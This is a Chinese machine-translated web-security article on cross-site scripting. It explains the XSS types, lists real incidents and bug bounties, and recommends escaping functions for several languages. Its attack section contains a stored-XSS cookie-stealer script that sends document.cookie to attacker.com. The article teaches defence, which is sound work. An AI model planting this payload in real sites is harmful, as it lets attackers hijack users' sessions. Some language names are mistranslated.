# 跨站点脚本(XSS)😈

> 原文：<https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f>

## 它是什么，为什么重要，它们是如何执行的，如何防止 XSS 漏洞，以及如何创建一个 cookie 窃取者！

![](img/f58aee854b6ceaad842f8b2cb99d439f.png)

纳赫尔·阿卜杜勒·哈迪在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上的照片

C ross-site scripting (XSS)是一种针对网站的攻击，攻击者可以让被攻击的网站向用户发送 JavaScript。然后在用户的机器上执行该恶意 JavaScript。

各种类型的 XSS 是有区别的:

*   **存储的 XSS** :攻击者可以让网站存储 XSS，例如，通过在 Twitch 上创建包含恶意消息的脸书评论或聊天消息。然后，恶意消息被发送到访问该页面的每个新客户端。
*   XSS:有些网站允许你创建可以分享的链接。例如，谷歌搜索。URL 包含搜索词，如果有人点击该链接，谷歌将在页面上显示该链接中的搜索词。所以 Google 在页面上反映了链接的一个参数。如果攻击者更改搜索词以包含代码，则该代码可能会被点击链接的任何用户的浏览器执行。
*   **基于 DOM 的 XSS** :在现代 web 应用程序中，逻辑主要在客户端。这意味着攻击者不需要进入服务器端就可以进行破坏。现场 JavaScript 被攻击。与反映的 XSS 相反，服务器并没有直接导致问题。页面上的(有效)JavaScript 读取了攻击。

对于现代网站来说,**攻击面**相当大。

> 任何用户提供的数据都可能包含 XSS 攻击。它可以是评论区、广告、文档、推荐人、URL 片段等等

# 为什么它很重要

*   XSS 是 OWASP 十大漏洞之一，这意味着它被认为是一个常见的漏洞
*   mitre.org 上有**14625 个 CVE 条目针对 XSS** 漏洞([来源](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cross-site))
*   2005 年 : MySpace 上有一种叫做 [Samy](https://en.wikipedia.org/wiki/Samy_(computer_worm)) 的蠕虫。20 小时内，作者就有一百万用户加他为好友([来源](https://www.vice.com/en/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever))。由于 XSS 的攻击，MySpace 不得不关闭网站。
*   **2011** :脸书蠕虫允许自动墙贴([来源](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6c4ddf17-8e6d-4e92-8bec-f918cbf61afc&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments))
*   **2013** :贝宝被[罗伯特·库格勒](https://s3cur3.it/references)发现存在漏洞([来源](https://seclists.org/fulldisclosure/2013/May/163))。很有可能创建一个链接，当你点击它的时候，你就可以付费，而不需要你去交互。
*   **2013** :雅虎易受 XSS 的影响([来源](https://arstechnica.com/information-technology/2013/01/how-yahoo-allowed-hackers-to-hijack-my-neighbors-e-mail-account/)
*   **2016** :研究人员在脸书发现 XSS 漏洞([来源](https://whitton.io/articles/xss-on-facebook-via-png-content-types/))
*   **2018** :优步很容易受到 XSS 的攻击([来源](https://hackerone.com/reports/191810))。优步为此支付了 3000 美元。
*   **2019** : Steam 易受存储的 XSS 攻击([来源](https://hackerone.com/reports/409850))。Steam 为此支付了 7500 美元。
*   **2020** :脸书为寻找 XSS 袭击[来源](https://portswigger.net/daily-swig/xss-vulnerability-in-login-with-facebook-button-earns-20-000-bug-bounty)支付**2 万美元**。
*   **2020** : Tumblr 容易受到基于 DOM 的 XSS 攻击([来源](https://hackerone.com/reports/882546))。Automattic 为此支付了 350 美元。

![](img/e537f0891d982807294f6dddb19fd9b8.png)

aaron Blanco Tejedor 在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上拍摄的照片

# XSS 袭击是如何实施的？

以下是攻击者造成危害的各种方式:如果网站上有 XSS 的脚本，他们可以使网站无法使用。他们可以运行一个**加密货币挖掘器**。他们可以**窃取敏感数据**。

正如承诺的那样，接下来是如何为**账户劫持**设计一个 **cookie 窃取者**。

我们只是假设我们有一个像脸书这样的网站，你可以在那里添加评论。我们假设评论只是照原样复制给每个打开页面的人。我们的意见是

```
<script>
    image = new Image();
    image.src='[https://attacker.com/steal?cookie='+document.cookie](https://attacker.com/?'+document.cookie);
</script>
```

您可以看到这不会做任何事情——对于其他用户来说，这看起来只是一条空消息。它不会刷新页面。它不会打开另一个窗口。但是它将调用带有一个参数`cookie`的 GET 请求`http://attacker.com/steal`。因此，在攻击者方面，只需要有一个可到达的 web 服务器，并记录这些请求。之后，攻击者可以使用 cookie 并冒充受害者。攻击者不知道受害者的凭证，而是劫持了会话。

# 我能做些什么来防止 XSS 袭击？

N 曾经盲目信任用户数据。移除潜在有害零件，避开会改变预期输出的零件。你可能想去掉和`<script>`标签或者用`&lt;`代替`<`。但是这还不够。您还可以使用 [onload 属性](https://www.w3schools.com/jsref/event_onload.asp)来执行 JavaScript。该属性可以添加到许多甚至所有的 HTML 标签中。

各种语言都有避免这些错误的方法:

*   去:`[EscapeString](https://golang.org/pkg/html/#EscapeString)`
*   Java: `[org.apache.commons.lang.StringEscapeUtils.escapeHtml](https://commons.apache.org/proper/commons-lang/javadocs/api-2.6/org/apache/commons/lang/StringEscapeUtils.html#escapeHtml(java.lang.String))`
*   JavaScript: `[DOMPurify](https://www.npmjs.com/package/dompurify)`
*   Python: `[html.escape](https://docs.python.org/3/library/html.html#html.escape)`
*   PHP: `[htmlspecialchars](https://www.php.net/manual/en/function.htmlspecialchars.php)`
*   鲁比:`[htmlescape](https://ruby-doc.org/stdlib-2.6.3/libdoc/erb/rdoc/ERB/Util.html#method-c-html_escape)`
*   生锈:`[htmlescape::encode_miniaml](https://docs.rs/htmlescape/0.3.1/htmlescape/fn.encode_minimal.html)`

此外，请确保您尽可能早地这样做。应该有一种安全的方法来使用数据库中的数据——并且不需要知道其中有潜在的有害数据。因此，在将数据放入数据库之前，对其进行转义。确保转义是[幂等的](https://en.wikipedia.org/wiki/Idempotence) —转义两次应该和转义一次一样。如果你真的认为你在某处需要原件，你可以在数据库中有一个`_raw`字段。或者有一个数据访问层(DAL)来处理转义。

记住**清理所有用户输入**，不仅仅是输入字段中的内容。不要忘记 [URL 片段](https://martin-thoma.com/tags.html#klausur-ref)和`[Document.referrer](https://developer.mozilla.org/en-US/docs/Web/API/Document/referrer)`。

# 请参见

我喜欢[汤姆·斯科特](https://en.wikipedia.org/wiki/Tom_Scott_(entertainer))和[电脑爱好者](https://www.youtube.com/user/Computerphile)他们制作了一个关于这个话题的视频！

# 下一步是什么？

在这个关于应用安全(AppSec)的系列文章中，我们已经解释了攻击者的一些技术😈以及防守队员的技术😇：

*   第 1 部分: [SQL 注入](https://medium.com/faun/sql-injections-e8bc9a14c95)😈
*   第二部分:[不要泄密](/leaking-secrets-240a3484cb80)😇
*   第 3 部分:[跨站点脚本(XSS)](/cross-site-scripting-xss-fd374ce71b2f) 😈
*   第四部分:[密码哈希](/password-hashing-eb3b97684636)😇
*   第五部分: [ZIP 炸弹](https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112)😈
*   第六部分:[验证码](https://medium.com/plain-and-simple/captcha-500991bd90a3)😇
*   第七部分:[电子邮件欺骗](https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf)😈
*   第 8 部分:[软件组成分析](https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e) (SCA)😇

这即将到来:

*   CSRF😈
*   磁盘操作系统😈
*   凭据填充😈
*   密码劫持😈
*   单点登录😇
*   双因素认证😇
*   备份😇
*   磁盘加密😇

如果您对更多关于 AppSec / InfoSec 的文章感兴趣，请告诉我！